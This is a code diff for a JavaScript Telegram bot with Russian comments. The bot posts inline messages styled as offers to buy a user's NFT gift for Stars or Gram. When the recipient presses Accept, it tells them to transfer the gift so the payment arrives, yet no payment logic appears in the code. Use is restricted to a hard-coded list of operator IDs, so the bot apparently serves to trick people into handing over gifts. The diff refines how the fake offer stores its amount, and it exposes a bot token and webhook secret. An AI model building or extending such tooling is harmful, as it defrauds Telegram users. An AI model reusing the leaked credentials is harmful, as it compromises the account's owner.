@@ -2,7 +2,6 @@ const ADMIN_ID = 5151757168;
 const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
 const WEBHOOK_SECRET = "GarisOffer9231998"; // ТВОЙ СЕКРЕТ
 
-// ТУТ ВСЕ ТВОИ ID (включая новый)
 const ALLOWED_IDS = [
   5151757168, 
   9021098137, 
@@ -53,14 +52,12 @@ export default {
 
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
-        // Очистка от скрытых символов (защита от iPhone)
+        // Очистка текста от скрытых символов (защита от iPhone)
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
-        // Ищем сумму
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
-        // Ищем ссылку/название подарка
         const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
         let giftLink = "";
         if (giftMatch) {
@@ -72,28 +69,31 @@ export default {
             }
         }
 
-        // ОПРЕДЕЛЯЕМ ВАЛЮТУ (по умолчанию Stars)
-        let currency = "⭐ Stars";
+        // ОПРЕДЕЛЯЕМ ВАЛЮТУ
+        let currencyType = "stars";
+        let currencyDisplay = "⭐ Stars";
         if (textQuery.includes("gram") || textQuery.includes("ton")) {
-            currency = "💎 Gram";
+            currencyType = "gram";
+            currencyDisplay = "💎 Gram";
         }
 
         let senderName = iq.from.first_name || "";
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currency} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
         const results = [{
           type: "article",
           id: "1",
           title: `Оффер от ${senderName}`,
-          description: `За ${amount} ${currency}`,
+          description: `За ${amount} ${currencyDisplay}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              [{ text: "✅ Принять", callback_data: "acc" }],
-              [{ text: "❌ Отклонить", callback_data: "dec" }]
+              // ЗАШИВАЕМ СУММУ И ВАЛЮТУ В КНОПКУ (безопасно, до 64 байт)
+              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}` }],
+              [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
           }
         }];
@@ -107,6 +107,13 @@ export default {
         
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
             
+          // ДОСТАЕМ ДАННЫЕ ИЗ КНОПКИ
+          const dataParts = cq.data.split("|");
+          const action = dataParts[0];
+          const amount = dataParts[1] || "0";
+          const currencyType = dataParts[2] || "stars";
+          const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
+
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
@@ -114,22 +121,10 @@ export default {
 
           let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";
 
-          const messageText = cq.message.text || cq.message.caption || "";
-          
-          // Вытаскиваем сумму
-          const amountMatch = messageText.match(/(\d+)/);
-          const amount = amountMatch ? amountMatch[1] : "указанную сумму";
-
-          // ОПРЕДЕЛЯЕМ ВАЛЮТУ ИЗ СООБЩЕНИЯ (Stars или Gram)
-          let displayCurrency = "⭐ Stars";
-          if (messageText.toLowerCase().includes("gram") || messageText.toLowerCase().includes("ton")) {
-            displayCurrency = "💎 Gram";
-          }
-
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
 
-          if (cq.data.startsWith("acc")) {
+          if (action === "acc") {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
               text: `Предложение успешно принято ✅\n\nПередайте подарок, чтобы ${amount} ${displayCurrency} пришли`, 
@@ -145,6 +140,7 @@ export default {
             newText = `❌ <b>Вы отказались от оффера.</b>`;
           }
 
+          // МЕНЯЕМ СООБЩЕНИЕ (БЕЗОПАСНО)
           if (cq.inline_message_id) {
             try {
               if (cq.message && cq.message.caption !== undefined) {
